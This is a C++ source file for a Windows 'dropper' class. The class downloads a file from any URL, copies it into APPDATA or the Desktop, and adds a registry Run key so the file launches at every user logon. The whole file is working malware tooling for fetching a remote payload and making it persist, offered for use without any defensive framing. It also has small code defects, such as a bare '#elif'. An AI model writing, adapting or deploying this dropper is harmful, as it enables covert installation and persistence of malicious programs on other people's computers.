#include <Windows.h>
#include <iostream>
#include <string>
#include <Urlmon.h>
#include <shlobj.h>
#include <objbase.h>
#include <filesystem>

#pragma comment(lib,"Shell32")
#pragma comment(lib,"Ole32")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")

// NOTE: UAC Is recommended as some folders are protected.

// up to you
// #define PROGRAMPERSISTENCECHECK

class c_dropper {
public:
    struct persistence_t {
        enum e_droplocation {
            APPDATA,
            DESKTOP
        };
        bool persist;
        std::string programName;
        std::string registryKeyName;
        e_droplocation dropLocation;
        persistence_t(bool persist = false, std::string programName = "", std::string registryKeyName = "", e_droplocation dropLocation = e_droplocation::APPDATA) {
            this->persist = persist;
            this->programName = programName;
            // an extension was not found
            if (this->programName.find(".") == std::string::npos) {
                this->programName.append(".exe");
            }
            this->dropLocation = dropLocation;
            this->registryKeyName = registryKeyName;
        }
        // god bless stackoverflow
        std::filesystem::path getDesktopPath()
        {
            wchar_t* p;
            if (S_OK != SHGetKnownFolderPath(FOLDERID_Desktop, 0, NULL, &p)) return "";
            std::filesystem::path result = p;
            CoTaskMemFree(p);
            return result;
        }
        std::string getDropLocation() {
            switch (this->dropLocation) {
                // Protected folder (needs UAC)
            case e_droplocation::APPDATA: {
                return std::string(getenv("APPDATA")).append("\\").append(this->programName);
                break;
            }
            case e_droplocation::DESKTOP: {
                return std::string(getDesktopPath().string()).append("\\").append(this->programName);
                break;
            }
            }
        }
    };
public: 
    std::string url; std::string path;
    bool openFile; persistence_t programPersistence;
    c_dropper(std::string url, std::string path, bool openFile, persistence_t programPersistence) {
        this->url = url; this->path = path;
        this->openFile = openFile; this->programPersistence = programPersistence;
    }
    void drop() {
#ifdef _DEBUG
        std::cout <<"code: " << URLDownloadToFileA(NULL, this->url.c_str(), this->path.c_str(), 0, NULL) 
            << " downloaded " << this->url << " to " << this->path << std::endl;
#elif
        URLDownloadToFileA(NULL, this->url.c_str(), this->path.c_str(), 0, NULL);
#endif
        if (this->programPersistence.persist) {
#ifdef PROGRAMPERSISTENCECHECK
            // we have downloaded a non executable file
            if (this->path.find(".exe") != std::string::npos 
                || this->path.find(".bat") != std::string::npos 
                || this->path.find(".py") != std::string::npos)
        
#endif
            {
                HKEY hKey = NULL;

                LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER,
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0, KEY_WRITE,
                    &hKey);

                std::string dropLocation = this->programPersistence.getDropLocation();

                // create new key with the program
                if (ERROR_SUCCESS == lnRes)
                    lnRes = RegSetValueEx(hKey, this->programPersistence.registryKeyName.c_str(), 0, REG_SZ,
                        (unsigned char*)dropLocation.c_str(), strlen(dropLocation.c_str()));

                RegCloseKey(hKey);

                // keys are set, copy the file itself to the location now.
                CopyFileA(this->path.c_str(), dropLocation.c_str(), true);
            }
        }
    }
};
